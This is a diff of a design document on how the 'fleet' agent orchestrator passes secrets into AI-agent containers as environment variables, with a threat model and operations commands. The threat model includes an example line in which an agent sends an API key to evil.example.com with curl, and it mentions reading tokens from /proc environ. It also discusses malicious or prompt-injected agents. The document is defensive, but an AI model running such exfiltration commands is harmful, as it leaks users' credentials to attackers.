@@ -1,122 +1,199 @@
-# Identity brokering
+# Identity & secrets
 
-This page covers the **identity-material** boundary: how Claude OAuth,
-`gh` tokens, and the worker `.gitconfig` reach the VM now that the host
-home is no longer bind-mounted. See [`sandbox.md`](./sandbox.md) for the
-filesystem story this depends on, and [`network.md`](./network.md) for
-egress control.
+This page covers the **identity-brokering** boundary fleet enforces.
+Companion documents are [`sandbox.md`](./sandbox.md) for filesystem
+isolation and [`network.md`](./network.md) for egress control.
 
-## Why brokering at all
+The short version: secrets reach the agent as environment variables on
+the container, never as files. Fleet doesn't store secrets, doesn't
+cache them, doesn't refresh them. Token lifecycle stays fully on the
+host.
 
-Before Phase 1, `gh`/`git`/`claude` inside the VM read host-side files
-transparently via the `~` bind-mount. After Phase 1, the lima user's
-`$HOME` inside the VM is on private ext4 — `~/.config/gh/`,
-`~/.gitconfig`, and `~/.claude/` are completely absent unless fleet
-actively puts them there.
-
-The fix: **resolve identity material on the host immediately before
-`fleet start`, forward it through Lima as env vars, and have the
-bootstrap script materialize it into VM-private files.** Every brokered
-value follows the same pipeline:
+## How a secret gets to the agent
 
 ```
-host secret backend
-   ↓ resolve at fleet start
-process env var on `limactl shell`
-   ↓ --preserve-env + LIMA_SHELLENV_ALLOW
-guest bash env
-   ↓ bootstrap script reads, writes a 600-mode file in $HOME, unsets the var
-worker process env / dotfile in $HOME
+host process env (fleet)
+       │
+       │  reads named env vars listed in agents.registry.<name>.env_passthrough
+       ▼
+fleet executor
+       │
+       │  builds (key, value) pairs for the container spec
+       ▼
+RuntimeAdapter::start_container
+       │
+       │  --remote-env KEY=value flags to the devcontainer CLI
+       ▼
+agent process inside container
 ```
 
-## What fleet brokers
+Concretely, given this fragment in `.fleet/config.yaml`:
 
-| What                    | Env var (host → guest)   | Where it lands inside VM           |
-| ----------------------- | ------------------------ | ---------------------------------- |
-| Claude OAuth token      | `CLAUDE_CODE_OAUTH_TOKEN` | `~/.claude/.credentials.json`     |
-| gh CLI token            | `GH_TOKEN`               | (stays in env — `gh` reads it)     |
-| Worker git identity     | `FLEET_GITCONFIG_B64`    | `~/.gitconfig` (decoded from base64) |
+```yaml
+agents:
+  registry:
+    claude-code:
+      command: [claude, code]
+      env_passthrough: [ANTHROPIC_API_KEY]
+    aider:
+      command: [aider]
+      env_passthrough: [OPENAI_API_KEY]
+```
 
-## Claude OAuth
+When fleet runs a node whose `agent:` is `claude-code`, it reads
+`ANTHROPIC_API_KEY` from its **own** process environment via
+`std::env::var`, packs the resulting `(KEY, value)` into the
+container spec, and the runtime adapter passes it through to the
+devcontainer CLI's `--remote-env` flag. If the var isn't set in
+fleet's environment, the agent gets nothing (no error, no default).
 
-Resolution: `[secrets.claude_code_oauth_token]` in
-`~/.config/fleet/config.toml` (env / keychain / 1Password).
+## What goes into env
 
-Inside the VM the bootstrap script writes a `chmod 600` credentials file
-in the now-VM-private `~/.claude/`, then `unset CLAUDE_CODE_OAUTH_TOKEN`
-so claude takes the file-based auth path (env-token mode shows the login
-menu interactively in claude 2.1.139). The same write also stamps
-`hasCompletedOnboarding: true` and `skipDangerousModePermissionPrompt:
-true` into the VM's claude config — host claude is no longer mutated as
-a side effect.
+Per-node, the executor builds the env list from four sources:
 
-## gh CLI
+1. The agent registry's `env_passthrough` list (the secrets).
+2. The persona name (for the agent's system prompt prefix).
+3. The prompt artifact path (when `prompt_file:` is set).
+4. The issue context, when one was passed: `FLEET_ISSUE_ID`,
+   `FLEET_ISSUE_HUMAN_ID`, `FLEET_ISSUE_TITLE`.
 
-Two resolution paths, in order:
+Only the first source carries secrets. The other three are
+plain-text routing.
 
-1. **`[secrets.gh_token]`** in `~/.config/fleet/config.toml`. Use this
-   when you want agents to act with a separate identity from yours
-   (recommended for any setup beyond personal projects):
-   ```toml
-   [secrets.gh_token]
-   backend = "op"
-   ref = "op://Employee/Fleet Agent GitHub Token/credential"
-   ```
-2. **`gh auth token` on the host**, run by fleet during `fleet start`.
-   Lazy default for the personal-use case: you already ran `gh auth
-   login` on the host, fleet just relays the same token to the VM.
+## What's NOT done
 
-The forwarded value lives in the worker shell as `GH_TOKEN`. `gh`
-prefers that over any on-disk config, so `gh issue list`, `gh pr
-create`, etc. work without an in-VM `gh auth login`. Tmux propagates
-the env into AO's worker panes, so the value persists for the lifetime
-of the AO server.
+- **No keyring integration.** The v2 plan called for a `keyring` crate
+  storing tokens in the macOS Keychain / Linux Secret Service. That
+  hasn't landed. Today the only way to get a secret to the agent is
+  to set the env var in fleet's process — typically by exporting it
+  in your shell before running `fleet ui` / `fleet workflow run`, or
+  by sourcing a `.env` (with a shell tool, not fleet — fleet does
+  not read `.env` files).
+- **No automatic rotation.** Fleet reads the value once per container
+  start; long-running sessions keep that value for their lifetime.
+  Rotating an upstream token requires restarting fleet.
+- **No secret refresh inside the container.** If the agent's request
+  exceeds the token's lifetime, the agent sees the upstream's
+  `401` — same as any other long-running client.
+- **No file-based secrets.** Some toolchains (Kubernetes, Docker
+  Compose) mount secrets as files. Fleet doesn't. If the agent needs
+  a file (e.g. a GCP service account JSON), the user is responsible
+  for committing it inside the worktree or writing it to
+  `/artifacts/` before the agent starts. Fleet treats `.fleet/`
+  itself as gitignored by default; secrets in `.fleet/config.yaml`
+  would leak — don't put them there.
 
-Neither resolution required: if both paths fail (no fleet secret AND
-host `gh` not logged in), `GH_TOKEN` is simply absent. `gh` inside the
-VM will fail with its own clear "not authenticated" message when called.
+## Per-tracker auth
 
-## Git identity
+Trackers are the only place fleet acts on behalf of the user against
+an external service. The auth story is different for each:
 
-Resolution, in order:
+### GitHub (`tracker: github`)
 
-1. **`[git]`** in `~/.config/fleet/config.toml`:
-   ```toml
-   [git]
-   user_name  = "Worker Bot"
-   user_email = "bot@example.com"
-   ```
-2. **The host's own `~/.gitconfig`** — `user.name` and `user.email` are
-   read out of the `[user]` section. Signing keys and any other section
-   are intentionally not forwarded (they typically reference host-side
-   paths or a host gpg-agent that doesn't exist inside the VM).
-3. **Skipped.** Workers will fail to commit until you set one of the
-   above; git itself surfaces a clear "Please tell me who you are" error.
+Fleet shells `gh issue list --json …` directly from the host. Auth is
+whatever `gh auth status` reports — fleet doesn't touch `gh`'s tokens
+or refresh state. Your host's `~/.config/gh/hosts.yml` is consulted.
 
-The resolved content is base64-encoded into `FLEET_GITCONFIG_B64` (so
-multi-line INI survives the env-var round trip), decoded by the
-bootstrap script into `$HOME/.gitconfig`, and the env var is `unset` so
-it doesn't leak into worker env dumps.
+If `gh` isn't logged in, `fleet issues list` surfaces gh's own error.
+Fix it with `gh auth login` on the host.
 
-To override per-worker: add a project-level `postCreate` hook in
-`agent-orchestrator.yaml` that `git config --local user.email` against
-the worktree. The brokered `~/.gitconfig` is global; project-specific
-identities should override locally rather than mutating it.
+The container itself never sees the gh token — trackers run host-side,
+not in the workflow container.
 
-## Threats and limits
+### git-bug (`tracker: git-bug`)
 
-- **`GH_TOKEN` is visible to every process inside the VM.** A
-  compromised worker can `cat /proc/<pid>/environ` and read the token.
-  Inside a single-tenant VM with one worker that's expected; for
-  multi-worker setups consider rotating to a scoped fleet agent PAT
-  via `[secrets.gh_token]` so the host token isn't on the line.
-- **Claude credentials file is VM-private but readable by the lima
-  user.** Any worker can read `~/.claude/.credentials.json`. Same
-  trust boundary as `GH_TOKEN`.
-- **Resolution happens at `fleet start` time, not per spawn.** If you
-  rotate a token on the host, restart the fleet AO stack (Shift+X →
-  Shift+S in the TUI, or `fleet stop && fleet start`) to refresh the
-  brokered value.
-- **Signing keys are intentionally not forwarded.** If you need GPG/SSH
-  commit signing inside the VM, configure it manually — fleet won't
-  silently mis-sign agent commits with the host user's identity.
+No auth. `git-bug` is a project-local issue tracker; it reads issue
+data out of the repo's git refs directly. Anyone who can clone the
+repo can list its issues. Fleet's involvement is just shelling
+`git-bug bug --format json` and parsing the JSON.
+
+### Linear / Jira (future)
+
+Not implemented today. The trait shape is open; new tracker plugins
+plug into `src/tracker/`.
+
+## Container-internal visibility
+
+Once a secret is in the container's env, the agent process can read
+it back via `std::env::var` (or `os.getenv`, or `process.env`, etc.).
+This is **by design** — the agent has to use the secret to make
+requests. There is no in-container split between fleet and the agent;
+the agent *is* the only fleet-spawned process inside the container.
+
+What this means in practice:
+
+- An agent that maliciously decides to echo `ANTHROPIC_API_KEY` to
+  its stdout will succeed. Fleet captures node output to
+  `.fleet/sessions/<id>/logs/<node>.log` — keep your `.fleet/`
+  gitignored, which `fleet init` does by default.
+- An agent that maliciously decides to `curl evil.example.com -d
+  $ANTHROPIC_API_KEY` is the case the **egress allowlist** defends
+  against. See [`network.md`](./network.md) — the proxy refuses
+  CONNECTs to hosts not on the allowlist.
+- The agent cannot read another session's env vars. Sessions are
+  filesystem- and process-disjoint per-container.
+
+## What this protects against
+
+- Tokens leaking into image layers. Image builds don't see
+  `--remote-env` values; they're injected at container start, not
+  at build time.
+- Tokens persisting in the container filesystem after the agent
+  exits. The container's writable layer is reclaimed; nothing leaks
+  to the host outside `/workspace` (the agent's own checkout) and
+  `/artifacts` (the agent's declared outputs).
+- The host's `gh` / git auth state being silently mutated by what
+  the agent does. The agent never sees the host's `~/.config/gh/`.
+  Token rotation stays a host concern.
+- One session leaking secrets to another. Each session runs in its
+  own container with its own env.
+
+## What it does NOT protect against
+
+- **An agent that wants to leak its own secrets.** As above — the
+  agent has to read them to use them; preventing it from echoing
+  them is out of scope. The egress allowlist is the real defence;
+  the identity boundary just keeps secrets from sticking to the
+  filesystem.
+- **A prompt-injected agent that uses the secret for legitimate-
+  looking calls to the LLM provider's API.** Anthropic billing has
+  no way to tell "agent was tricked into running a million tokens"
+  from "user asked the agent to run a million tokens." Set spend
+  alerts on your provider account; consider the cost-budget guardrail
+  follow-up (autonomous mode P3+ work, not shipped).
+- **Host-side credential exfil before fleet starts.** If the
+  attacker has read access to your shell's env at the point you run
+  fleet, they already have your secrets. The identity model assumes
+  your host shell environment is yours.
+
+## Operations
+
+**See which env vars an agent spec passes through.**
+
+```sh
+grep -A4 'registry:' .fleet/config.yaml
+```
+
+`env_passthrough` is the load-bearing line. If your agent isn't
+getting a secret it needs, that's the first thing to check.
+
+**Verify a secret is set in fleet's process before you run.**
+
+```sh
+echo "${ANTHROPIC_API_KEY:0:6}..."   # prints prefix only
+fleet workflow run standard
+```
+
+If the prefix prints empty, fleet won't get it either. Either
+`export ANTHROPIC_API_KEY=...` in the same shell or `source` a
+secrets file before invoking fleet.
+
+**Check what reached the container.**
+
+```sh
+fleet runtime exec -- env | grep -E '^(ANTHROPIC|OPENAI|GH_|FLEET_ISSUE)'
+```
+
+Lists every env var that crossed the boundary. If you don't see
+your var here but you do on the host, the agent's `env_passthrough`
+likely doesn't include it.
